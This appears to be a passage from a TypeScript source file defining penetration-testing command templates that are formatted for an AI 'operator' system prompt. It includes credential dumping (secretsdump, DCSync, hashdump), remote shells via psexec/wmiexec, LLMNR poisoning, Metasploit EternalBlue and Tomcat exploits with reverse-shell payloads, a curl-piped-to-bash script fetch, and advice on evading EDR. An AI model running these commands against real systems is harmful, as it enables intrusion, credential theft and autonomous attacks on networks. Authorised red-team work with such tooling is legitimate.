    mitre_techniques: ['T1558.004'],
  },
  {
    id: 'impacket-secretsdump',
    tool: 'impacket-secretsdump',
    label: 'Credential Dump (secretsdump)',
    category: 'Post-Exploitation',
    phase: 'post_exploitation',
    description: 'Dumps SAM database, LSA secrets, cached domain credentials, and NTDS.dit hashes from a compromised host.',
    when_to_use: 'Use this when you have admin access to a Windows host and want all stored credentials. On workstations it dumps local hashes; on domain controllers it can pull the entire AD hash database.',
    command: "impacket-secretsdump '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
    vars: ['domain', 'username', 'password', 'target'],
    tags: ['impacket', 'secretsdump', 'credentials', 'post-exploitation'],
    mitre_techniques: ['T1003.002'],
  },
  {
    id: 'impacket-dcsync',
    tool: 'impacket-secretsdump',
    label: 'DCSync (Domain Hash Dump)',
    category: 'Post-Exploitation',
    phase: 'post_exploitation',
    description: 'Requests all NTLM hashes from a domain controller using the replication protocol — no disk access needed.',
    when_to_use: 'Use this when you\'ve obtained Domain Admin or replication privileges. DCSync pulls every domain account hash via legitimate AD replication traffic — no need to touch NTDS.dit on disk. The krbtgt hash enables Golden Ticket attacks.',
    command: "impacket-secretsdump -just-dc-ntlm '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
    vars: ['domain', 'username', 'password', 'target'],
    tags: ['impacket', 'dcsync', 'golden-ticket', 'domain-admin'],
    mitre_techniques: ['T1003.006'],
  },
  {
    id: 'impacket-psexec',
    tool: 'impacket-psexec',
    label: 'Remote Shell via PSExec',
    category: 'Exploitation',
    phase: 'exploitation',
    description: 'Creates an interactive SYSTEM-level shell on a Windows host via SMB service pipes.',
    when_to_use: 'Use this when you have admin credentials and need an interactive shell. PSExec is reliable and well-known — use wmiexec first to be quieter. PSExec creates a Windows service, which is detectable by EDR.',
    command: "impacket-psexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
    vars: ['domain', 'username', 'password', 'target'],
    tags: ['impacket', 'psexec', 'shell', 'windows'],
    mitre_techniques: ['T1021.002'],
  },
  {
    id: 'impacket-wmiexec',
    tool: 'impacket-wmiexec',
    label: 'Remote Shell via WMI (Quieter)',
    category: 'Exploitation',
    phase: 'exploitation',
    description: 'Provides a semi-interactive shell via WMI without creating services — lower EDR footprint than psexec.',
    when_to_use: 'Use this over psexec when stealth matters. WMI execution doesn\'t create a service on the target and is harder to detect. Slightly less stable than psexec but the right default for a real engagement.',
    command: "impacket-wmiexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
    vars: ['domain', 'username', 'password', 'target'],
    tags: ['impacket', 'wmiexec', 'wmi', 'stealth'],
    mitre_techniques: ['T1047'],
  },

  // ── RESPONDER ─────────────────────────────────────────────────────────────────

  {
    id: 'responder-poison',
    tool: 'responder',
    label: 'LLMNR/NBT-NS Poisoning',
    category: 'Active Directory',
    phase: 'exploitation',
    description: 'Poisons LLMNR and NBT-NS broadcast name resolution — captures NTLMv2 challenge/response hashes from any host that queries a nonexistent name.',
    when_to_use: 'Use this on internal networks during the exploitation phase. Leave it running in the background — any user who browses to a nonexistent share or mistype a hostname sends you their NTLMv2 hash. Crack with hashcat -m 5600 or relay with ntlmrelayx.',
    command: 'sudo responder -I {{ interface }} -rdwv',
    vars: ['interface'],
    tags: ['responder', 'llmnr', 'ntlmv2', 'hashes', 'internal'],
    mitre_techniques: ['T1557.001'],
  },

  // ── POST-EXPLOITATION ─────────────────────────────────────────────────────────

  {
    id: 'linpeas',
    tool: 'linpeas',
    label: 'Linux Privilege Escalation Audit',
    category: 'Post-Exploitation',
    phase: 'post_exploitation',
    description: 'Comprehensive Linux privilege escalation enumeration — checks SUID binaries, sudo rules, cron jobs, writable paths, and kernel exploits.',
    when_to_use: 'Use this immediately after gaining a foothold on a Linux host. LinPEAS surfaces every realistic privesc vector: writable cron jobs, SUID binaries, sudo misconfigs, and outdated kernel versions.',
    command: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee linpeas_output.txt',
    vars: [],
    tags: ['linpeas', 'privesc', 'linux', 'post-exploitation'],
    mitre_techniques: ['T1083', 'T1057', 'T1068'],
  },
  {
    id: 'pspy',
    tool: 'pspy',
    label: 'Process Spy (No Root)',
    category: 'Post-Exploitation',
    phase: 'post_exploitation',
    description: 'Monitors running processes and cron executions without root access — watches for scheduled tasks that might be exploitable.',
    when_to_use: 'Use this when linpeas shows interesting cron jobs or scripts but you want to confirm they\'re actually running. Pspy catches processes even when run by root and shows the full command line including secrets passed as arguments.',
    command: './pspy64 -i 1000',
    vars: [],
    tags: ['pspy', 'cron', 'processes', 'linux'],
    mitre_techniques: ['T1057', 'T1053.003'],
  },

  // ── METASPLOIT ────────────────────────────────────────────────────────────────

  {
    id: 'msf-eternalblue-check',
    tool: 'auxiliary/scanner/smb/smb_ms17_010',
    label: 'EternalBlue Vulnerability Check',
    category: 'Metasploit',
    phase: 'scanning',
    description: 'Safely checks whether the target is vulnerable to MS17-010 (EternalBlue) without attempting exploitation.',
    when_to_use: 'Use this before running the EternalBlue exploit. It confirms the vulnerability is present and that the target isn\'t patched, saving you a noisy failed exploit attempt.',
    command: 'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {{ target }}; run; exit -y"',
    vars: ['target'],
    tags: ['msf', 'eternalblue', 'ms17-010', 'smb'],
    mitre_techniques: ['T1595.002'],
  },
  {
    id: 'msf-eternalblue-exploit',
    tool: 'exploit/windows/smb/ms17_010_eternalblue',
    label: 'EternalBlue Exploit (Meterpreter)',
    category: 'Metasploit',
    phase: 'exploitation',
    description: 'Exploits MS17-010 on Windows 7/Server 2008 R2 — returns a SYSTEM-level Meterpreter session.',
    when_to_use: 'Use this when the MS17-010 check confirms vulnerability. Target must be Windows 7 or Server 2008 R2 (unpatched). Gives you SYSTEM access in seconds. Document the shell acquisition for the report.',
    command: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {{ target }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit; sleep 10; exit -y"',
    vars: ['target', 'lhost', 'lport'],
    tags: ['msf', 'eternalblue', 'rce', 'system'],
    mitre_techniques: ['T1190', 'T1068'],
  },
  {
    id: 'msf-tomcat',
    tool: 'exploit/multi/http/tomcat_mgr_upload',
    label: 'Tomcat Manager WAR Upload',
    category: 'Metasploit',
    phase: 'exploitation',
    description: 'Deploys a malicious WAR file via Tomcat Manager — achieves RCE on any OS when manager credentials are known.',
    when_to_use: 'Use this when you\'ve found Tomcat Manager (/manager/html) and have valid credentials (often admin:admin or tomcat:tomcat by default). Cross-platform — works on Linux and Windows Tomcat installs.',
    command: 'msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {{ target }}; set RPORT {{ port }}; set HttpUsername {{ username }}; set HttpPassword {{ password }}; set LHOST {{ lhost }}; set PAYLOAD java/meterpreter/reverse_tcp; exploit; sleep 10; exit -y"',
    vars: ['target', 'port', 'username', 'password', 'lhost'],
    tags: ['msf', 'tomcat', 'war', 'rce'],
    mitre_techniques: ['T1190'],
  },
  {
    id: 'msf-vsftpd',
    tool: 'exploit/unix/ftp/vsftpd_234_backdoor',
    label: 'vsFTPd 2.3.4 Backdoor',
    category: 'Metasploit',
    phase: 'exploitation',
    description: 'Exploits the backdoor in vsFTPd 2.3.4 — triggers a root shell on port 6200.',
    when_to_use: 'Use this when FTP (port 21) is open and the banner shows vsFTPd 2.3.4. This is a classic CTF/lab exploit — the backdoored version opens port 6200 when a specific character sequence is sent.',
    command: 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {{ target }}; exploit; sleep 5; exit -y"',
    vars: ['target'],
    tags: ['msf', 'vsftpd', 'backdoor', 'ftp'],
    mitre_techniques: ['T1190'],
  },
  {
    id: 'msf-exploit-suggester',
    tool: 'post/multi/recon/local_exploit_suggester',
    label: 'Local Privilege Escalation Suggester',
    category: 'Metasploit',
    phase: 'post_exploitation',
    description: 'Analyzes a Meterpreter session and recommends local privilege escalation exploits applicable to the target OS.',
    when_to_use: 'Use this on an existing Meterpreter session to identify privesc paths. Run it as soon as you get a non-SYSTEM shell — it cross-references the OS version and patch level against known local exploits.',
    command: 'msfconsole -q -x "use post/multi/recon/local_exploit_suggester; set SESSION {{ session_id }}; run; exit -y"',
    vars: ['session_id'],
    tags: ['msf', 'privesc', 'post-exploitation'],
    mitre_techniques: ['T1068'],
  },
  {
    id: 'msf-hashdump-linux',
    tool: 'post/linux/gather/hashdump',
    label: 'Linux Password Hash Dump',
    category: 'Metasploit',
    phase: 'post_exploitation',
    description: 'Dumps /etc/shadow from a compromised Linux session — requires root access.',
    when_to_use: 'Use this on an existing root Meterpreter session to extract all local password hashes. Feed the output to hashcat for offline cracking.',
    command: 'msfconsole -q -x "use post/linux/gather/hashdump; set SESSION {{ session_id }}; run; exit -y"',
    vars: ['session_id'],
    tags: ['msf', 'hashdump', 'linux', 'post-exploitation'],
    mitre_techniques: ['T1003.008'],
  },
  {
    id: 'msf-hashdump-windows',
    tool: 'post/windows/gather/hashdump',
    label: 'Windows SAM Hash Dump',
    category: 'Metasploit',
    phase: 'post_exploitation',
    description: 'Dumps the SAM database (NTLM hashes) from a Windows SYSTEM Meterpreter session.',
    when_to_use: 'Use this on a SYSTEM-level Meterpreter session to extract local Windows password hashes. Use the NTLM hashes directly for pass-the-hash or crack them with hashcat mode 1000.',
    command: 'msfconsole -q -x "use post/windows/gather/hashdump; set SESSION {{ session_id }}; run; exit -y"',
    vars: ['session_id'],
    tags: ['msf', 'hashdump', 'windows', 'ntlm'],
    mitre_techniques: ['T1003.002'],
  },

  // ── AWS ───────────────────────────────────────────────────────────────────────

  {
    id: 'aws-whoami',
    tool: 'aws',
    label: 'Verify AWS Identity',
    category: 'Cloud',
    phase: 'recon',
    description: 'Confirms what credentials you\'re using and what account/role they belong to.',
    when_to_use: 'Use this first when you\'ve obtained AWS credentials. Immediately confirms whether the keys are valid, what account they\'re in, and what IAM role/user they belong to — critical before doing anything else.',
    command: 'aws sts get-caller-identity --profile {{ aws_profile }}',
    vars: ['aws_profile'],
    tags: ['aws', 'iam', 'cloud', 'recon'],
    mitre_techniques: ['T1078.004', 'T1526'],
  },
  {
    id: 'aws-iam-privesc-check',
    tool: 'aws',
    label: 'IAM Permission Enumeration',
    category: 'Cloud',
    phase: 'enumeration',
    description: 'Lists what IAM permissions the current credentials have by checking attached policies.',
    when_to_use: 'Use this to understand the blast radius of compromised credentials. Knowing exactly what you can and can\'t do shapes the rest of the cloud engagement — look for iam:CreateAccessKey, s3:GetObject on sensitive buckets, and ec2:RunInstances.',
    command: 'aws iam list-attached-user-policies --user-name {{ username }} --profile {{ aws_profile }} && aws iam list-user-policies --user-name {{ username }} --profile {{ aws_profile }}',
    vars: ['username', 'aws_profile'],
    tags: ['aws', 'iam', 'permissions', 'cloud'],
    mitre_techniques: ['T1078.004', 'T1069.003'],
  },
  {
    id: 'aws-s3-list',
    tool: 'aws',
    label: 'S3 Bucket Enumeration',
    category: 'Cloud',
    phase: 'enumeration',
    description: 'Lists all accessible S3 buckets and their contents.',
    when_to_use: 'Use this to find exposed data in S3. Even with limited credentials, you may have ListBucket and GetObject access to buckets containing credentials, backups, or sensitive data. Check for public buckets too.',
    command: 'aws s3api list-buckets --profile {{ aws_profile }} && aws s3 ls s3://{{ bucket_name }} --profile {{ aws_profile }}',
    vars: ['aws_profile', 'bucket_name'],
    tags: ['aws', 's3', 'data-exposure', 'cloud'],
    mitre_techniques: ['T1530'],
  },
  {
    id: 'aws-ec2-instances',
    tool: 'aws',
    label: 'EC2 Instance Enumeration',
    category: 'Cloud',
    phase: 'enumeration',
    description: 'Lists all EC2 instances with their IPs, security groups, and metadata.',
    when_to_use: 'Use this to map the AWS attack surface. Reveals public-facing instances, security group configurations, and metadata that might point to misconfigured services or accessible admin panels.',
    command: 'aws ec2 describe-instances --profile {{ aws_profile }} --region {{ aws_region }} --query "Reservations[].Instances[].{ID:InstanceId,IP:PublicIpAddress,State:State.Name,SG:SecurityGroups[].GroupName}" --output table',
    vars: ['aws_profile', 'aws_region'],
    tags: ['aws', 'ec2', 'cloud', 'enumeration'],
    mitre_techniques: ['T1526'],
  },
]

// ── Helper functions ──────────────────────────────────────────────────────────

export const ALL_CATEGORIES: Category[] = [
  'Network', 'Web', 'Active Directory', 'OSINT', 'Cloud', 'Exploitation', 'Post-Exploitation', 'Metasploit',
]

export const ALL_PHASES: Phase[] = [
  'recon', 'scanning', 'enumeration', 'exploitation', 'post_exploitation',
]

export const PHASE_LABELS: Record<Phase, string> = {
  recon: 'Recon',
  scanning: 'Scanning',
  enumeration: 'Enumeration',
  exploitation: 'Exploitation',
  post_exploitation: 'Post-Exploitation',
}

// Hex/rgba values for use in inline styles (dynamic color generation)
export const CATEGORY_COLORS: Record<Category, string> = {
  'Network':          '#94a3b8',
  'Web':              '#94a3b8',
  'Active Directory': '#c084fc',
  'OSINT':            '#4ade80',
  'Cloud':            '#94a3b8',
  'Exploitation':     '#fb923c',
  'Post-Exploitation':'#fbbf24',
  'Metasploit':       '#f87171',
}

export const PHASE_COLORS: Record<Phase, { bg: string; border: string; text: string }> = {
  recon:            { bg: 'rgba(100,116,139,0.15)', border: 'rgba(100,116,139,0.3)', text: '#94a3b8' },
  scanning:         { bg: 'rgba(240,168,58,0.1)',   border: 'rgba(240,168,58,0.3)',  text: '#f0a83a' },
  enumeration:      { bg: 'rgba(100,116,139,0.1)', border: 'rgba(100,116,139,0.3)', text: '#94a3b8' },
  exploitation:     { bg: 'rgba(239,68,68,0.1)',    border: 'rgba(239,68,68,0.3)',   text: '#f87171' },
  post_exploitation:{ bg: 'rgba(251,191,36,0.1)',   border: 'rgba(251,191,36,0.3)',  text: '#fbbf24' },
}

/** Returns templates for the given list of tool IDs, up to maxPerTool each. */
export function getTemplatesForTools(toolIds: string[], maxPerTool = 3): CommandTemplate[] {
  const seen = new Map<string, number>()
  const out: CommandTemplate[] = []
  for (const t of TEMPLATES) {
    if (!toolIds.includes(t.tool)) continue
    const count = seen.get(t.tool) ?? 0
    if (count >= maxPerTool) continue
    seen.set(t.tool, count + 1)
    out.push(t)
  }
  return out
}

/** Return all templates for a single tool ID. */
export function getTemplatesForTool(toolId: string): CommandTemplate[] {
  return TEMPLATES.filter(t => t.tool === toolId)
}

/** Format templates for inclusion in an LLM system prompt. */
export function formatTemplatesForPrompt(templates: CommandTemplate[]): string {
  if (!templates.length) return '  (none)'
  const byTool = new Map<string, CommandTemplate[]>()
  for (const t of templates) {
    const arr = byTool.get(t.tool) ?? []
    arr.push(t)
    byTool.set(t.tool, arr)
  }
  return [...byTool.entries()].map(([tool, ts]) => {
    const lines = [`  [${tool}]`]
    for (const t of ts) {
      lines.push(`    • ${t.label}: ${t.command}`)
      if (t.vars.length) lines.push(`      vars: ${t.vars.join(', ')} (substitute {{ var }} with actual values)`)
    }
    return lines.join('\n')
  }).join('\n\n')
}

/**
 * Format templates for the AI Operator system prompt.
 * Shows template IDs and variable slots — used when the model must reference a template_id.
 */
export function formatTemplatesForOperator(templates: CommandTemplate[]): string {
  if (!templates.length) return '  (none)'
  const byTool = new Map<string, CommandTemplate[]>()
  for (const t of templates) {
    const arr = byTool.get(t.tool) ?? []
    arr.push(t)
    byTool.set(t.tool, arr)
  }
  return [...byTool.entries()].map(([tool, ts]) => {
    const lines = [`  [${tool}]`]
    for (const t of ts) {
      lines.push(`    • template_id="${t.id}" — ${t.label}`)
      lines.push(`      base: ${t.command}`)
      if (t.vars.length) lines.push(`      vars: ${t.vars.join(', ')}`)
    }
    return lines.join('\n')
  }).join('\n\n')
}
